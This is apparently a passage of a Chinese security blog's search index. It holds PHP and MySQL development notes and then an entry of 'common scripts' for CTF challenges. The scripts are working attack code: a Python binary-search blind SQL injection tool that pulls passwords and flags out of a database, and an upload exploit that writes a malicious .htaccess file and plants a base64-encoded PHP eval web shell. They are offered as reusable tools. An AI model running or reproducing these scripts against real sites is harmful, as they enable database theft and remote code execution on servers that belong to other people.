异常必须手动抛出 1throw new Exception($message, $code); 注意如果异常没有匹配到catch块将报Error 异常类Exception getCode(): 返回错误代码 getMessage(): 返回错误信息 getFile(): 返回产生异常的文件完整路径 getLine(): 返回错误代码行号 getTrace(): 返回异常代码回溯路径的数组 getTraceAsString(): 返回回溯路径数组的格式化形式 __toString(): string输出异常 1234567891011121314&lt;?phpclass myException extends Exception&#123; function __toString()&#123; return \"&lt;strong&gt;\".$this-&gt;getMessage().\"&lt;/strong&gt;\"; &#125;&#125;try&#123; throw new myException(\"error\");&#125;catch(myException $m)&#123; echo $m;&#125;catch(Exception $m)&#123; echo $m;&#125;?&gt; 第八章 web数据库设计避免保存冗余数据, 当冗余数据过多会出现修改, 插入和删除异常 避免出现大量空值 第九章 Web数据库创建安装步骤 安装文件 如果需要, 创建并设置MySQL的运行用户 设置路径 如果需要, 运行mysql_install_db 设置root用户密码 删除匿名用户和测试数据库 启动MySQL并设置为自动运行 大小写sql语句不区分大小写, 数据库名称和表名称区分大小写(linux下) 创建用户创建用户可以使用 1create user user_info identified by password; 或者使用grant自动创建用户 12-- since mysql 5.5.7grant privileges on item to user_info identified by password; 权限大部分情况下, php脚本只需要select, insert, update, delete操作 可以通过grant授予和revoke取回, 部分权限如file具有极大的安全问题 如果所运行的grant语句已经执行, 但是尝试登陆时被拒绝, 通常是因为安装中的匿名用户没有被删除 查看数据库1234-- 查看所有数据库show databases;-- 显示数据库结构describe database_name; 部分类型当读取char类型或者写入varchar数据时, mysql将过去结尾处多余的空格 blob, 二进制大对象, 可以用来存储图像声音数据等","link":"/2019/11/24/php和mysql开发笔记/"},{"title":"常用脚本","text":"记录一下常用的一些脚本 SQL二分盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsfrom time import sleepurl = \"http://8fd845b8-4242-4441-ab34-57c8386d5faf.node3.buuoj.cn/backend/content_detail.php\"proxies = &#123; \"http\": \"127.0.0.1:8080\"&#125;def attack(cur, mid=\"\"): # payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,0)\" % (cur, mid) # payload = \" or length((select group_concat(password) from users))=&#123;&#125;#\".format(cur) # 一开始把#写成%23, 结果一直不对, 后面才想起python会自动编码... # payload = \" or if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,0)#\" % (cur, mid) # payload = \"0^(ascii(substr(((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database()))),%d,1))&gt;%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d)\" % (cur, mid) data = &#123; \"id\": payload &#125; res = requests.get(url, params=data, proxies=proxies) # print(res.text) if res.status_code == 429: print('too fast') if \"content\" in res.text: return True else: return Falsedef try_length(): for i in range(1, 10): if attack(i): print(i) break sleep(0.02)def main(): flag = \"\" for i in range(1, 22): end = 127 start = 31 mid = (end + start) // 2 while end &gt; start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() SSTI判断图 .htaccess上传getshell1234567891011121314151617181920212223242526import requestsimport base64url = r\"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag\"# SIZE_HEADER = b\"#define width 1\\n#define height 1\\n\\n\"SIZE_HEADER = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"htaccess = SIZE_HEADER + b\"\"\"AddType application/x-httpd-php .ccphp_value auto_prepend_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc\"\"\"\"files = [ (\"file\",(\".htaccess\", htaccess, \"image/gif\"))]proxy = &#123;\"http\": \"127.0.0.1:8080\"&#125;res = requests.post(url, files=files, proxies=proxy).textprint(res)shell = SIZE_HEADER + b\"00\" + base64.b64encode(b\"&lt;?php eval($_GET['cjm00n']);?&gt;\")files = [ (\"file\",(\"shell.cc\", shell, \"image/gif\"))]proxy = &#123;\"http\": \"127.0.0.1:8080\"&#125;res = requests.post(url, files=files, proxies=proxy).textprint(res)","link":"/2020/02/16/常用脚本/"}],"tags":[{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"Config","slug":"Config","link":"/tags/Config/"},{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"HackTheBox","slug":"HackTheBox","link":"/tags/HackTheBox/"},{"name":"Web开发","slug":"Web开发","link":"/tags/Web开发/"},{"name":"Script","slug":"Script","link":"/tags/Script/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Pentest","slug":"Pentest","link":"/categories/Pentest/"},{"name":"Web","slug":"Web","link":"/categories/Web/"}]}